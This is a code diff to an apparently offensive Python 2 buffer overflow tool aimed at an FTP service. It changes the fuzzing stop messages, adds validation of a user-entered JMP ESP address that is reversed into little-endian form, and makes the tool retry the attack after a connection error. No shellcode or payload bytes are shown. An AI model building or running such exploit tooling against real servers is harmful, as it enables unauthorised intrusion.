@@ -80,7 +80,15 @@ class Buffer_Over():
 				    length=(int(len(Buffer)))
 				    Fuzzer +=100
 			  except:
-		              print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(length)+W+ R+ " Characters"+W  
+		             if  Fuzzer > 100:                           
+                                 print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(length)+W+ R+ " Characters"+W 
+                             else:
+                               print Y+"\n[+]"+W+R+"String Pattern NOT Generated :"+W 
+                               time.sleep(1)
+                               print Y+"\n[+]"+W+B+"service is down "+W 
+                               time.sleep(1)
+                               print  Banner
+                               exit()   
 		    except NameError:
                              print O+"\n***_***_"+W+R+"[::"+W+Y+"Fuzzing NOT Start"+W+R+"::'Connection Error :::::']"+W+O+"***_***"+W
 			     self.ip_port()
@@ -198,10 +206,14 @@ class Buffer_Over():
                        print  Banner
                        exit() 
          
-     def little_endian(self):
-         
+     def little_endian(self):       
                try:
                     jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
+                    if len(jump) < 4 :
+                        print Y+"\n[(*)]"+W+R+"JMP ESP is Required "+W+Y+"[(*)] "+W  
+	                return self.little_endian()  
+	            else:
+	               pass             
                     time.sleep(2)
                     self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                     self.display =self.jump_address# for print olnly
@@ -245,11 +257,10 @@ class Buffer_Over():
                except socket.error, exc :
                          print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W
                          time.sleep(2)
-                         print R+"\n::::::The Connection Down Please  Check FTP_SERVER is ONLINE :::: "+W
+                         print R+"\n::::::The Connection Down Please  Check FTP_SERVER NOT ONLINE :::: "+W
                          time.sleep(2)    
-                         print O+"\n[(!)]"+W+Y+"Connection is Down >> Exception Socket.Error"+W+O+" :"+W +R+"%s\n" %exc+W
-                         print  Banner
-                         exit()  
+                         self.little_endian()        
+                         self.attack_all()
                except KeyboardInterrupt:
                    print  Banner
                    exit()  
@@ -305,6 +316,8 @@ class Buffer_Over():
 		          
 if __name__ == '__main__':
    Buffer_Over()
+
+
 
 
 
